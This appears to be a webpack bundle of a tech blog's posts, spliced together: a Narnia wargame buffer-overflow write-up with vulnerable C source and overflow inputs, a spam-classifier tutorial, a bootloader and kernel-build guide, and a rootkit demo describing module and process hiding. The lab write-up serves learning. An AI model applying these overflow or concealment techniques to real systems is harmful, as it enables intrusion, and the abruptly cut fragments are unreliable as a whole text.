In the source code, we see that we are only setting <code>buf</code>'s value with the user’s input. So how can we overwrite <code>val</code>? <code>buf</code> is defined as being 20 bytes in length. If we attempt to fill <code>buf</code> with greater than 20 bytes of data we will overflow into a higher memory address, which happens to belong to <code>val</code>. Let’s try it.</p>\\n<pre><code class=\\\"language-sh\\\">narnia0@melinda:/narnia$ python -c <span class=\\\"hljs-string\\\">'print \\\"A\\\"*20 + \\\"B\\\"*4'</span> | ./narnia0 \\nCorrect vals value from 0x41414141 -&gt; 0xdeadbeef!\\nHere is your chance: buf: AAAAAAAAAAAAAAAAAAAABBBB\\nval: 0x42424242\\nWAY OFF!!!!\\n</code></pre>\\n<p>Notice <code>val</code> was overwritten with <code>0x42424242</code>.

Note that the string is <code>\\\\xef\\\\xbe\\\\xad\\\\xde</code> and not <code>\\\\xde\\\\xad\\\\xbe\\\\xef</code>. This is because our computer stores memory in <strong>little-endian</strong> format. So we see <code>val</code> has been overwritten with <code>0xdeadbeef</code>, but where’s our shell?

Let’s see what the stack looks like just before the next instruction is executed. We can do this by setting a breakpoint with <code>break *main+75</code>. Run the program with <code>run AAAA</code>. <strong>AAAA</strong> is the argument we provided the program. We will soon look for where that variable is stored in memory to calculate the length of our buffer overflow.

It is called a NOP slide because <code>x\\\\90</code> is the NOP, or “No Operation”, instruction which does nothing except advance the EIP register.

Classification just means that something can be placed into a specific group based on its characteristics. In our case we can either classify an email as <strong>spam</strong> or not spam, often called <strong>ham</strong>.</p>\\n<p>So how can a computer decipher whether an email is considered spam or ham? A time-tested method that can be used is a <em>Bayesian filter</em>. I will not go into the mathematics behind a Bayesian filter here but if you are interested in learning more about this, an awesome article over at <a href=\\\"https://betterexplained.com/articles/an-intuitive-and-short-explanation-of-bayes-theorem/\\\">Better Explained</a> provides a very intuitive explanation.</p>\\n<p>We are going to train a classifier that will detect whether an email is spam or ham based on its textual content. Words like <em>viagra</em> and <em>lottery</em> are going to appear more frequently in spam emails than legitimate ones. The classifier will use this knowledge to make its decision when classifying an email.</p>\\n<h3>Let’s Get Started</h3>\\n<h4>Project Structure</h4>\\n<pre><code>.\\n├── data\\n│   ├── enron1\\n│   │   ├── ham\\n│   │   └── spam\\n│   ├── enron2\\n│   │   ├── ham\\n│   │   └── spam\\n│   └── enron3\\n│       ├── ham\\n│       └── spam\\n├── <span class=\\\"hljs-class\\\"><span class=\\\"hljs-keyword\\\">lib</span></span>\\n│   ├── __init__.py\\n│   ├── model.py\\n│   └── shell.py\\n├── main.py\\n└── requirements.txt\\n</code></pre>\\n<p>The data folder contains three different datasets. The spam and ham folders contain a bunch of <code>.txt</code> files that are the emails. <code>lib/model.py</code> is our machine learning classifier and <code>lib/shell.py</code> is a Python shell that we will use to interact with the trained model. <code>main.py</code> kicks off all the fun.</p>\\n<h4>Building the Classifier</h4>\\n<h5>Initialization</h5>\\n<pre><code class=\\\"language-Python\\\">// lib/model.py\\n\\n<span class=\\\"hljs-keyword\\\">from</span> __future__ <span class=\\\"hljs-keyword\\\">import</span> print_function, division\\n<span class=\\\"hljs-keyword\\\">import</span> os\\n<span class=\\\"hljs-keyword\\\">from</span> collections <span class=\\\"hljs-keyword\\\">import</span> Counter\\n<span class=\\\"hljs-keyword\\\">from</span> string <span class=\\\"hljs-keyword\\\">import</span> punctuation\\n<span class=\\\"hljs-keyword\\\">from</span> random <span class=\\\"hljs-keyword\\\">import</span> shuffle, randint\\n<span class=\\\"hljs-keyword\\\">from</span> nltk <span class=\\\"hljs-keyword\\\">import</span> WordNetLemmatizer, word_tokenize\\n<span class=\\\"hljs-keyword\\\">from</span> nltk.corpus <span class=\\\"hljs-keyword\\\">import</span> stopwords\\n<span class=\\\"hljs-keyword\\\">from</span> nltk <span class=\\\"hljs-keyword\\\">import</span> NaiveBayesClassifier, classify\\n\\n<span class=\\\"hljs-class\\\"><span class=\\\"hljs-keyword\\\">class</span> <span class=\\\"hljs-title\\\">Model</span><span class=\\\"hljs-params\\\">(object)</span>:</span>\\n    stoplist = stopwords.words(<span class=\\\"hljs-string\\\">'english'</span>)\\n    \\n    <span class=\\\"hljs-function\\\"><span class=\\\"hljs-keyword\\\">def</span> <span class=\\\"hljs-title\\\">__init__</span><span class=\\\"hljs-params\\\">(self)</span>:</span>\\n        self.trainDir = self.getRandomDir()\\n        strTrainDir = str(self.trainDir)\\n        print(<span class=\\\"hljs-string\\\">'Training with enron'</span> + strTrainDir + <span class=\\\"hljs-string\\\">' dataset.'</span>)\\n        hamPath = <span class=\\\"hljs-string\\\">'data/enron'</span> + strTrainDir + <span class=\\\"hljs-string\\\">'/ham/'</span>\\n        spamPath = <span class=\\\"hljs-string\\\">'data/enron'</span> + strTrainDir + <span class=\\\"hljs-string\\\">'/spam/'</span>\\n        spamFiles = os.listdir(spamPath)\\n        hamFiles = os.listdir(hamPath)\\n        hamCorpus = self.buildCorpus(hamFiles, hamPath)\\n        spamCorpus = self.buildCorpus(spamFiles, spamPath)\\n        self.emails = self.labelEmails(spamCorpus, hamCorpus)\\n        <span class=\\\"hljs-keyword\\\">print</span> (<span class=\\\"hljs-string\\\">'CORPUS SIZE: '</span> + str(len(self.emails)) + <span class=\\\"hljs-string\\\">' emails\\\\n'</span>)\\n        shuffle(self.emails)\\n        \\n<span class=\\\"hljs-meta\\\">    @staticmethod</span>\\n    <span class=\\\"hljs-function\\\"><span class=\\\"hljs-keyword\\\">def</span> <span class=\\\"hljs-title\\\">buildCorpus</span><span class=\\\"hljs-params\\\">(fileList, path)</span>:</span>\\n        corpus = []\\n        <span class=\\\"hljs-keyword\\\">for</span> file <span class=\\\"hljs-keyword\\\">in</span> fileList:\\n            <span class=\\\"hljs-keyword\\\">if</span> <span class=\\\"hljs-keyword\\\">not</span> file.startswith(<span class=\\\"hljs-string\\\">'.'</span>):\\n                f = open(path + file, <span class=\\\"hljs-string\\\">'r'</span>)\\n                corpus.append(f.read())\\n        f.close()\\n        <span class=\\\"hljs-keyword\\\">return</span> corpus\\n\\n<span class=\\\"hljs-meta\\\">    @staticmethod</span>\\n    <span class=\\\"hljs-function\\\"><span class=\\\"hljs-keyword\\\">def</span> <span class=\\\"hljs-title\\\">getRandomDir</span><span class=\\\"hljs-params\\\">()</span>:</span>\\n        numDirs = len([f <span class=\\\"hljs-keyword\\\">for</span> f <span class=\\\"hljs-keyword\\\">in</span> os.listdir(<span class=\\\"hljs-string\\\">'data'</span>) <span class=\\\"hljs-keyword\\\">if</span> <span class=\\\"hljs-keyword\\\">not</span> f.startswith(<span class=\\\"hljs-string\\\">'.'</span>)])\\n        <span class=\\\"hljs-keyword\\\">return</span> randint(<span class=\\\"hljs-number\\\">1</span>, numDirs)\\n\\n<span class=\\\"hljs-meta\\\">    @staticmethod</span>\\n    <span class=\\\"hljs-function\\\"><span class=\\\"hljs-keyword\\\">def</span> <span class=\\\"hljs-title\\\">labelEmails</span><span class=\\\"hljs-params\\\">(spam, ham)</span>:</span>\\n        emails = [(email, <span class=\\\"hljs-string\\\">'ham'</span>) <span class=\\\"hljs-keyword\\\">for</span> email <span class=\\\"hljs-keyword\\\">in</span> ham]\\n        emails.extend([(email, <span class=\\\"hljs-string\\\">'spam'</span>) <span class=\\\"hljs-keyword\\\">for</span> email <span class=\\\"hljs-keyword\\\">in</span> spam])\\n        <span class=\\\"hljs-keyword\\\">return</span> emails\\n</code></pre>\\n<p>First, we need to initialize everything and correctly label the datasets. The first few lines of code will choose a dataset at random and load it into the program. This dataset will be used to train the classifier. The <code>labelEmails</code> function goes through all the emails and creates two arrays. Each array is an array of tuples with each tuple containing an email and its corresponding label.</p>\\n<h5>Preprocessing</h5>\\n<pre><code class=\\\"language-Python\\\">// lib/model.py\\n\\n<span class=\\\"hljs-class\\\"><span class=\\\"hljs-keyword\\\">class</span> <span class=\\\"hljs-title\\\">Model</span><span class=\\\"hljs-params\\\">(object)</span>:</span>\\n    stoplist = stopwords.words(<span class=\\\"hljs-string\\\">'english'</span>)\\n    \\n    // Previous functions removed\\n    // to increase readability\\n    \\n<span class=\\\"hljs-meta\\\">    @staticmethod</span>\\n    <span class=\\\"hljs-function\\\"><span class=\\\"hljs-keyword\\\">def</span> <span class=\\\"hljs-title\\\">preprocess</span><span class=\\\"hljs-params\\\">(email)</span>:</span>\\n        lemmatizer = WordNetLemmatizer()\\n        <span class=\\\"hljs-comment\\\"># Tokenize email</span>\\n        tokens = word_tokenize(unicode(email, errors=<span class=\\\"hljs-string\\\">'ignore'</span>), language=<span class=\\\"hljs-string\\\">'english'</span>)\\n        <span class=\\\"hljs-comment\\\"># Remove punctuation from token list</span>\\n        tokens = [token <span class=\\\"hljs-keyword\\\">for</span> token <span class=\\\"hljs-keyword\\\">in</span> tokens <span class=\\\"hljs-keyword\\\">if</span> token <span class=\\\"hljs-keyword\\\">not</span> <span class=\\\"hljs-keyword\\\">in</span> punctuation]\\n        <span class=\\\"hljs-comment\\\"># Lemmatize the tokens</span>\\n        lemmatized = [lemmatizer.lemmatize(token.lower()) <span class=\\\"hljs-keyword\\\">for</span> token <span class=\\\"hljs-keyword\\\">in</span> tokens]\\n        <span class=\\\"hljs-keyword\\\">return</span> lemmatized\\n\\n    <span class=\\\"hljs-function\\\"><span class=\\\"hljs-keyword\\\">def</span> <span class=\\\"hljs-title\\\">getFeatures</span><span class=\\\"hljs-params\\\">(self, email)</span>:</span>\\n        <span class=\\\"hljs-keyword\\\">return</span> { word: count <span class=\\\"hljs-keyword\\\">for</span> word, count <span class=\\\"hljs-keyword\\\">in</span> Counter(self.preprocess(email)).items() <span class=\\\"hljs-keyword\\\">if</span> <span class=\\\"hljs-keyword\\\">not</span> word <span class=\\\"hljs-keyword\\\">in</span> self.stoplist }\\n</code></pre>\\n<p>So now that we have two arrays of spam and ham we need to extract the significant features from each email. We begin by preprocessing the data. In the <code>preprocess</code> function we take the email and split it into a bunch of <em>tokens</em>.</p>\\n<pre><code class=\\\"language-Python\\\"><span class=\\\"hljs-meta\\\">&gt;&gt;&gt; </span>word_tokenize(unicode(<span class=\\\"hljs-string\\\">\\\"They’ve done studies, you know. 60 percent of the time, it works every time.\\\"</span>, errors=<span class=\\\"hljs-string\\\">'ignore'</span>), language=<span class=\\\"hljs-string\\\">'english'</span>)\\n[<span class=\\\"hljs-string\\\">u'Theyve'</span>, <span class=\\\"hljs-string\\\">u'done'</span>, <span class=\\\"hljs-string\\\">u'studies'</span>, <span class=\\\"hljs-string\\\">u','</span>, <span class=\\\"hljs-string\\\">u'you'</span>, <span class=\\\"hljs-string\\\">u'know'</span>, <span class=\\\"hljs-string\\\">u'.'</span>, <span class=\\\"hljs-string\\\">u'60'</span>, <span class=\\\"hljs-string\\\">u'percent'</span>, <span class=\\\"hljs-string\\\">u'of'</span>, <span class=\\\"hljs-string\\\">u'the'</span>, <span class=\\\"hljs-string\\\">u'time'</span>, <span class=\\\"hljs-string\\\">u','</span>, <span class=\\\"hljs-string\\\">u'it'</span>, <span class=\\\"hljs-string\\\">u'works'</span>, <span class=\\\"hljs-string\\\">u'every'</span>, <span class=\\\"hljs-string\\\">u'time'</span>, <span class=\\\"hljs-string\\\">u'.'</span>]\\n</code></pre>\\n<p>Next, we strip the tokenized array of all punctuation and lemmatize the tokens. Lemmatizing returns the base for a given word. I.E. “footballs” becomes “football” and “walking” becomes “walk”. Using the base of each word helps the classifier correctly classify an email.</p>\\n<p>The <code>getFeatures</code> function takes the preprocessed email and counts the frequency of each word. Note that if the word is in the <em>stoplist</em> it is not counted. Stopwords are words that have no contextual significance. These are words like “a”, “the”, and “because”.</p>\\n<h4>Training the Classifier</h4>\\n<pre><code class=\\\"language-Python\\\">// lib/model.py\\n\\n<span class=\\\"hljs-class\\\"><span class=\\\"hljs-keyword\\\">class</span> <span class=\\\"hljs-title\\\">Model</span><span class=\\\"hljs-params\\\">(object)</span>:</span>\\n    stoplist = stopwords.words(<span class=\\\"hljs-string\\\">'english'</span>)\\n    \\n    // Previous functions removed\\n    // to increase readability\\n    \\n    <span class=\\\"hljs-function\\\"><span class=\\\"hljs-keyword\\\">def</span> <span class=\\\"hljs-title\\\">train</span><span class=\\\"hljs-params\\\">(self, proportion=<span class=\\\"hljs-number\\\">0.8</span>)</span>:</span>\\n        print(<span class=\\\"hljs-string\\\">'Generating feature sets...'</span>)\\n        features = [(self.getFeatures(email), label) <span class=\\\"hljs-keyword\\\">for</span> (email, label) <span class=\\\"hljs-keyword\\\">in</span> self.emails]\\n        trainSize = int(len(features) * proportion)\\n        <span class=\\\"hljs-comment\\\"># Training set is first 80% of features</span>\\n        self.trainSet, self.testSet = features[:trainSize], features[trainSize:]\\n        <span class=\\\"hljs-comment\\\"># Train the classifier</span>\\n        print(<span class=\\\"hljs-string\\\">'Training predictive model...'</span>)\\n        self.classifier = NaiveBayesClassifier.train(self.trainSet)\\n        \\n    <span class=\\\"hljs-function\\\"><span class=\\\"hljs-keyword\\\">def</span> <span class=\\\"hljs-title\\\">evaluate</span><span class=\\\"hljs-params\\\">(self)</span>:</span>\\n        <span class=\\\"hljs-comment\\\"># Check how the classifier performs the test set</span>\\n        print(<span class=\\\"hljs-string\\\">'\\\\n----------------- RESULTS -----------------'</span>)\\n        <span class=\\\"hljs-keyword\\\">print</span> (<span class=\\\"hljs-string\\\">'TEST SET ACCURACY:     '</span> + <span class=\\\"hljs-string\\\">'{0:.1%}'</span>.format(classify.accuracy(self.classifier, self.testSet)) + <span class=\\\"hljs-string\\\">'\\\\n'</span>)\\n\\n        self.classifier.show_most_informative_features(<span class=\\\"hljs-number\\\">20</span>)\\n        print(<span class=\\\"hljs-string\\\">'\\\\n----------------- END RESULTS -------------'</span>)\\n</code></pre>\\n<p>In the <code>train</code> function we use the <code>getFeatures</code> function we just built. After we have the array of featurized (this is probably not a word) emails and their corresponding labels, we split up the feature set into a training set and a validation set. The general rule of thumb is to use 80% of the set for training and the remaining 20% for validation. The training set is then fed into the classifier. The classifier uses Bayesian filtering on the training set to generate a model which is then returned to us.</p>\\n<p><code>evaluate</code> just prints out the accuracy of the model by running it against the validation set we portioned off earlier. We will use this in the next section.</p>\\n<h4>Building an Interactive Shell</h4>\\n<pre><code class=\\\"language-Python\\\">// lib/shell.py\\n\\n<span class=\\\"hljs-keyword\\\">from</span> __future__ <span class=\\\"hljs-keyword\\\">import</span> print_function\\n<span class=\\\"hljs-keyword\\\">from</span> random <span class=\\\"hljs-keyword\\\">import</span> choice\\n<span class=\\\"hljs-keyword\\\">from</span> cmd <span class=\\\"hljs-keyword\\\">import</span> Cmd\\n<span class=\\\"hljs-keyword\\\">import</span> os\\n\\n<span class=\\\"hljs-class\\\"><span class=\\\"hljs-keyword\\\">class</span> <span class=\\\"hljs-title\\\">Shell</span><span class=\\\"hljs-params\\\">(Cmd)</span>:</span>\\n\\n    prompt = <span class=\\\"hljs-string\\\">'&gt;

We grab a random dataset that we didn’t use to train the model with and use that to test the classifier. We have the option to feed the model a single email or the whole batch and see the results. I used the Python Cmd library to build the shell.

In order to learn more about this I have built an <em>extremely</em> simple bootloader using assembly language.</p>\\n<h3>What Is a Bootloader?</h3>\\n<p>When you turn on your computer, the <strong>BIOS</strong> (Basic Input Output System) runs a <strong>POST</strong> (Power On Self Test) test to ensure your machine has ample power, memory, and devices installed. If this test passes, the BIOS then loads a bootloader which is responsible for loading the kernel.</p>\\n<p>When the bootloader program is ran it is executed under 16-bit Real Mode. Real Mode means that you have unlimited direct access to all addressable memory. Also, virtual memory and memory protection do not exist at this point.</p>\\n<p>In this example we will not be loading a kernel, but instead display a simple “Hello, World!” on an x86 emulator. However, the concepts learned here are the basis for building a real bootloader.</p>\\n<h3>The Nitty-Gritty</h3>\\n<p>Here is the full program.

Let’s break it down.</p>\\n<pre><code>bits    <span class=\\\"hljs-number\\\">16</span>\\norg     <span class=\\\"hljs-number\\\">0x7c00</span> \\n</code></pre>\\n<p>The first line declares we are using 16 bit mode. All x86 compatible computers boot into 16 bit mode. The second line tells the compiler to ensure all address are relative to <code>0x7c00</code>. The BIOS automatically loads us into <code>0x7c00</code> so we need to account for that.</p>\\n<pre><code><span class=\\\"hljs-symbol\\\">start:</span>\\n        <span class=\\\"hljs-keyword\\\">jmp</span>         main\\n</code></pre>\\n<p>Assembly programs are read line-by-line. We make the first executable command to jump over the rest of our helper operations and into the main part of our program.</p>\\n<pre><code><span class=\\\"hljs-symbol\\\">main:</span>\\n        <span class=\\\"hljs-keyword\\\">cli</span>                              <span class=\\\"hljs-comment\\\">; Disable hardware interrupts</span>\\n        <span class=\\\"hljs-keyword\\\">mov</span>         <span class=\\\"hljs-built_in\\\">si</span>, msg\\n        <span class=\\\"hljs-keyword\\\">call</span>        print\\n        <span class=\\\"hljs-keyword\\\">hlt</span>\\n</code></pre>\\n<p>In main, we first disable all hardware interrupts. This is necessary for bootloaders that run on x86 machines. Next, we move the address of the first character in <code>msg</code> into the <code>si</code> register. This sets us up to be able to run our print function to print <code>msg</code>. After the address has been loaded into <code>si</code> we call the print function. Let’s see what <code>print</code> looks like.</p>\\n<pre><code><span class=\\\"hljs-symbol\\\">print:</span>\\n        <span class=\\\"hljs-keyword\\\">lodsb</span>                            <span class=\\\"hljs-comment\\\">; Transfers byte @ DS:SI into AL &amp;&amp; SI++</span>\\n        <span class=\\\"hljs-keyword\\\">or</span>          <span class=\\\"hljs-built_in\\\">al</span>, <span class=\\\"hljs-built_in\\\">al</span>\\n        <span class=\\\"hljs-keyword\\\">jz</span>          return\\n        <span class=\\\"hljs-keyword\\\">mov</span>         <span class=\\\"hljs-number\\\">ah</span>, <span class=\\\"hljs-number\\\">0x0e</span>             <span class=\\\"hljs-comment\\\">; Load \\\"Teletype Output\\\"</span>\\n        <span class=\\\"hljs-keyword\\\">int</span>         <span class=\\\"hljs-number\\\">0x10</span>                 <span class=\\\"hljs-comment\\\">; Print character to screen</span>\\n        <span class=\\\"hljs-keyword\\\">jmp</span>         print\\n</code></pre>\\n<p><code>lodsb</code> loads what is pointed to by <code>si</code> into the <code>al</code> register and increments <code>si</code> by one. We then check if we’ve reached the end of the null terminated string with <code>or al, al</code>. If we have we return out of the function, if not we keep going. Now we set up to print the first character to the screen. We are going to use the <code>0x10</code> interrupt to print but first we must load <code>0x0e</code> into <code>ah</code>. <code>0x0e</code> is the number of the <em>Teletype Output</em> operation in the <code>0x10</code> interrupt vector. Finally, we call the interrupt and then loop to the top of <code>print</code> again and repeat until we’ve reached the end of the string.</p>\\n<pre><code><span class=\\\"hljs-symbol\\\">main:</span>\\n        <span class=\\\"hljs-keyword\\\">cli</span>                              <span class=\\\"hljs-comment\\\">; Disable hardware interrupts</span>\\n        <span class=\\\"hljs-keyword\\\">mov</span>         <span class=\\\"hljs-built_in\\\">si</span>, msg\\n        <span class=\\\"hljs-keyword\\\">call</span>        print\\n--&gt;     <span class=\\\"hljs-keyword\\\">hlt</span>\\n</code></pre>\\n<p>After returning out the print operation we halt the program because we are finished.</p>\\n<pre><code><span class=\\\"hljs-built_in\\\">times</span> <span class=\\\"hljs-number\\\">510</span> - ($-$$) <span class=\\\"hljs-built_in\\\">db</span> <span class=\\\"hljs-number\\\">0</span>\\n<span class=\\\"hljs-built_in\\\">dw</span> <span class=\\\"hljs-number\\\">0xAA55</span>  \\n</code></pre>\\n<p>In order for a bootloader to be valid it needs to be <strong>exactly</strong> 512 bytes. The first line ensures that we fill whatever space we didn’t use up to 512 with 0’s. <code>dw 0xAA55</code> is the <em>Boot Signature</em>. The BIOS looks for this value when determining for a bootable disk. This declares the disk the bootloader is stored on as bootable.</p>\\n<h3>Running the Bootloader</h3>\\n<p>We will be using an x86 emulator called <a href=\\\"http://wiki.qemu.org/\\\">QEMU</a> to test our bootloader.</p>\\n<p>First, we must compile the assembly program into a binary. We will be using NASM for this.</p>\\n<pre><code class=\\\"language-sh\\\">nasm <span class=\\\"hljs-_\\\">-f</span> bin tinyboot.asm -o tinyboot.bin\\n</code></pre>\\n<p>Once we have the binary we will be using <code>dd</code> to convert the binary into a floppy image we can boot from.</p>\\n<pre><code class=\\\"language-sh\\\">dd conv=notrunc <span class=\\\"hljs-keyword\\\">if</span>=tinyboot.bin of=floppy.flp\\n</code></pre>\\n<p>Almost there! We just need to launch QEMU with our new floppy image to see the magic happen.</p>\\n<pre><code class=\\\"language-sh\\\">qemu-system-i386 -fda floppy.flp\\n</code></pre>\\n<figure>\\n    <br/>\\n\\t<img style=\\\"\\\" src=\\\"./qemu.png\\\" alt=\\\"Bootloader\\\">\\n\\t<figcaption>Sample bootloader running on QEMU</figcaption>\\n</figure>\\n<p>So there you have it…our beautiful bootloader in all its glory!</p>\\n<h3>Final Thoughts</h3>\\n<p>This was a fun exercise but writing a custom bootloader is not very practical. If you were to develop an OS it is best to use a pre-existing bootloader like <a href=\\\"https://www.gnu.org/software/grub/\\\">GRUB</a>. Also, if you would like to learn more about bootloaders and OS development in general <a href=\\\"http://www.brokenthorn.com/\\\">BrokenThorn</a> and <a href=\\\"http://wiki.osdev.org/Main_Page\\\">OS Dev</a> are excellent resources.</p>\\n<p>Source code available on <a href=\\\"https://github.com/triedal/misc/blob/master/bootloader-example/tinyboot.asm\\\">GitHub</a>.</p>\\n\"}\n\n/***/ },\n/* 505 */\n/***/ function(module, exports) {\n\n\tmodule.exports = {\"title\":\"Compiling The Vanilla Linux Kernel\",\"date\":\"2017-03-14T23:51:47+00:00\",\"layout\":\"post\",\"path\":\"/compile-linux-kernel/\",\"category\":\"os dev\",\"description\":\"Guide to building the Linux kernel.\",\"body\":\"<p>Today I’m going to walk you through how to build the vanilla Linux kernel  step-by-step. Typically you will never need to compile your own kernel but it’s interesting to know how it’s done regardless. As a quick note, the Linux kernel we are going to be building today is different than the kernel you get from your distribution (Ubuntu, Debian, etc). This is the raw kernel that comes from Linux Torvalds himself. Linux kernels shipped from distributions are modified versions of the mainline kernel that include patches and customizations from the distributor.</p>\\n<p>I will be building the latest stable kernel (4.10.2 at the time of this writing) on Ubuntu 14.04 so these steps may not be exactly correct for you. However, the general process is the same.</p>\\n<h3>Prerequisites</h3>\\n<p>In order to compile the kernel we will need some tools. Let’s get those.</p>\\n<pre><code class=\\\"language-bash\\\">sudo apt-get install build-essential ncurses-dev libssl-dev wget\\n</code></pre>\\n<p>We’ll also need to get the kernel source and create a working directory.</p>\\n<pre><code class=\\\"language-bash\\\">mkdir linux &amp;&amp; <span class=\\\"hljs-built_in\\\">cd</span> linux\\nwget https://cdn.kernel.org/pub/linux/kernel/v4.x/linux-4.10.2.tar.xz\\n\\n</code></pre>\\n<h3>Let’s Get Started</h3>\\n<p>First, we’ll need to extract the kernel from the tarball. Once it is extracted we can delete the tarball as it is no longer needed.</p>\\n<pre><code class=\\\"language-bash\\\">tar xf linux-4.10.2.tar.xz\\nrm <span class=\\\"hljs-_\\\">-f</span> linux-4.10.2.tar.xz\\n</code></pre>\\n<p>Now <code>cd</code> into the extracted kernel directory.</p>\\n<h3>Kernel Configuration</h3>\\n<p>The Linux kernel requires a <code>.config</code> file for building. We will need to create this. You can manually create the config by going through each of the thousands of options one-by-one but that is not recommended. Instead we are going to use the config for our host OS as a baseline.</p>\\n<pre><code class=\\\"language-bash\\\">cp /boot/config-$(uname -r) .config\\nyes <span class=\\\"hljs-string\\\">\\\"\\\"</span> | make oldconfig\\n</code></pre>\\n<p>The above copies the host OS config into the config used for the kernel we are building. We then answer “yes” to any new configuration options in the vanilla kernel.</p>\\n<h3>Compiling</h3>\\n<p>We are now ready to compile the kernel. This is going to take some time so go grab some coffee. When compiling the kernel we have the option to specify how many cores we should use when compiling. Check how many cores you have available with the <code>nproc</code> command. I have 8 so I am going to use 6 of those for the compiling task.</p>\\n<pre><code class=\\\"language-bash\\\">make -j6\\n</code></pre>\\n<p>Hopefully your kernel compiled successfully. If it did you can move onto the next step. We now have to compile and install the kernel modules.</p>\\n<pre><code class=\\\"language-bash\\\">sudo make modules_install install\\n</code></pre>\\n<p>Congratulations! If you’ve made it this far you’ve successfully compiled a vanilla Linux kernel that is ready for use. From here you can update grub to boot into your new kernel. However, I will be booting the kernel using the qemu emulator. I plan on writing a follow-up tutorial for this in the near future.</p>\\n\"}\n\n/***/ },\n/* 506 */\n/***/ function(module, exports) {\n\n\tmodule.exports = {\"title\":\"Subverting the Linux Kernel for Fun and Profit\",\"date\":\"2017-04-22T23:51:47+00:00\",\"layout\":\"post\",\"path\":\"/rootkit-poc/\",\"category\":\"security\",\"description\":\"Demonstration of a simple rootkit developed for the 2.6.x Linux kernel.\",\"body\":\"<p>I’ve built a simple rootkit for the 2.6.x Linux kernel that has the ability to hide itself as well as hide processes. It’s fairly simple feature-wise but gave me a more insight into how rootkits work and allowed me to get my hands dirty in Linux kernel module development.</p>\\n<p>I’m not going to go into the specifics of how the code works, rather I’m just going to give a quick demo of the rootkit in action.</p>\\n<h3>What Is a Rootkit?</h3>\\n<p>First let’s explain what a rootkit is and how it relates to security. According to <a href=\\\"https://www.veracode.com/security/rootkit\\\">Veracode</a>:</p>\\n<blockquote>\\n<p>A rootkit is a clandestine computer program designed to provide continued privileged access to a computer while actively hiding its presence. The term rootkit is a connection of the two words “root” and “kit.” Originally, a rootkit was a collection of tools that enabled administrator-level access to a computer or network. Root refers to the Admin account on Unix and Linux systems, and kit refers to the software components that implement the tool. Today rootkits are generally associated with malware – such as Trojans, worms, viruses – that conceal their existence and actions from users and other system processes.</p>\\n</blockquote>\\n<p>So originally rootkits were used to provide remote administrator-level access to systems for legitimate uses. Schools and businesses were typical users of these rootkits. However, over time rootkits found their home in malware. A rootkit installed on a victim’s machine can conceal itself and allow remote access to the machine via a backdoor.</p>\\n<h3>Avoiding Detection</h3>\\n<p>To avoid detection, a rootkit must able to hide itself from the typical places you would be able to list installed kernel modules. This includes <code>/proc/modules</code> and <code>/sys/module</code>. As you can see in the figure below, the rootkit is not able to be found through <code>lsmod</code> after giving it the <code>modhide</code> command. All commands are issued to the rootkit through a character device.</p>\\n<figure>\\n    <br/>\\n\\t<img style=\\\"\\\" src=\\\"./modhide.gif\\\" alt=\\\"modhide cmd\\\">\\n\\t<figcaption>modehide command</figcaption>\\n</figure>\\n<p>To be able to uninstall the rootkit we must first reveal it by sending it the <code>modshow</code> command. Now we can safely use <code>rmmod</code> to remove it.</p>\\n<h3>Hiding Processes</h3>\\n<p>The rootkit also has the ability to hide currently running processes. This can be achieved by issuing the <code>phide</code> command with a PID as an argument. Let’s see this in action.</p>\\n<figure>\\n    <br/>\\n\\t<img style=\\\"\\\" src=\\\"./phide.gif\\\" alt=\\\"phide cmd\\\">\\n\\t<figcaption>phide command</figcaption>\\n</figure>\\n<p>Just like with <code>modhide</code>, we have a corresponding <code>pshow</code> command to reveal the process.</p>\\n<h3>Final Thoughts</h3>\\n<p>There are many features that a typical rootkit would include that are not included in this implementation.

Microservices should NOT know about each other. Microservices must be able to send messages into the ether and a seperate transport layer will route them to the correct listening microservice. Also, when designing a microservice architecture think about what the messages are before figuring out what microservices you will have. Once you have listed all the messages the microservices to support those messages will be obvious.</p>\\n</div>\\n<div class=\\\"book\\\">\\n  <img class=\\\"thumb\\\" src=\\\"./onward.jpg\\\">\\n  <h3>Onward</h3>\\n  <em>By Howard Schultz</em>\\n  <p>It was so long ago that I read this one that I don't remember any key take-aways but I do remember highly enjoying this book.

You don't need a business plan, you don't need funding, and you don't need a large team. One of my favorite pieces of advice in this book is \\\"Good enough is fine\\\". When facing an obstacle, look for a solution that delivers maximum efficiency with minimum effort. As an engineer, I think we have the tendency to create over optimized solutions to problems because it's sexy. However, these solutions do not necessarily contribute more added value to the bottom line and are just wasted time and effort. <em>Rework</em> also refutes the idea of workaholism. Workaholics don't accomplish more than nonworkaholics. Come up with an effienct solution rather than brute forcing more hours into it. This book goes hand-in-hand with <em>The Lean Startup</em>.</p>\\n</div>\\n\"}\n\n/***/ },\n/* 510 */\n/***/ function(module, exports, __webpack_require__, __webpack_module_template_argument_0__) {\n\n\t/**\n\t * Copyright 2013-present, Facebook, Inc.\n\t * All rights reserved.\n\t *\n\t * This source code is licensed under the BSD-style license found in the\n\t * LICENSE file in the root directory of this source tree.

There are many ways each challenge can be completed so please note that my way is not the only - or even best - way to solve each challenge.</p>\\n<h2>Level 0</h2>\\n<pre><code class=\\\"language-C\\\"><span class=\\\"hljs-comment\\\">// narnia0.c</span>\\n\\n<span class=\\\"hljs-meta\\\">#<span class=\\\"hljs-meta-keyword\\\">include</span> <span class=\\\"hljs-meta-string\\\">&lt;stdio.h&gt;</span></span>\\n<span class=\\\"hljs-meta\\\">#<span class=\\\"hljs-meta-keyword\\\">include</span> <span class=\\\"hljs-meta-string\\\">&lt;stdlib.h&gt;</span></span>\\n \\n<span class=\\\"hljs-function\\\"><span class=\\\"hljs-keyword\\\">int</span> <span class=\\\"hljs-title\\\">main</span><span class=\\\"hljs-params\\\">()</span></span>{\\n    <span class=\\\"hljs-keyword\\\">long</span> val=<span class=\\\"hljs-number\\\">0x41414141</span>;\\n    <span class=\\\"hljs-keyword\\\">char</span> buf[<span class=\\\"hljs-number\\\">20</span>];\\n \\n    <span class=\\\"hljs-built_in\\\">printf</span>(<span class=\\\"hljs-string\\\">\\\"Correct val's value from 0x41414141 -&gt; 0xdeadbeef!\\\\n\\\"</span>);\\n    <span class=\\\"hljs-built_in\\\">printf</span>(<span class=\\\"hljs-string\\\">\\\"Here is your chance: \\\"</span>);\\n    <span class=\\\"hljs-built_in\\\">scanf</span>(<span class=\\\"hljs-string\\\">\\\"%24s\\\"</span>,&amp;buf);\\n \\n    <span class=\\\"hljs-built_in\\\">printf</span>(<span class=\\\"hljs-string\\\">\\\"buf: %s\\\\n\\\"</span>,buf);\\n    <span class=\\\"hljs-built_in\\\">printf</span>(<span class=\\\"hljs-string\\\">\\\"val: 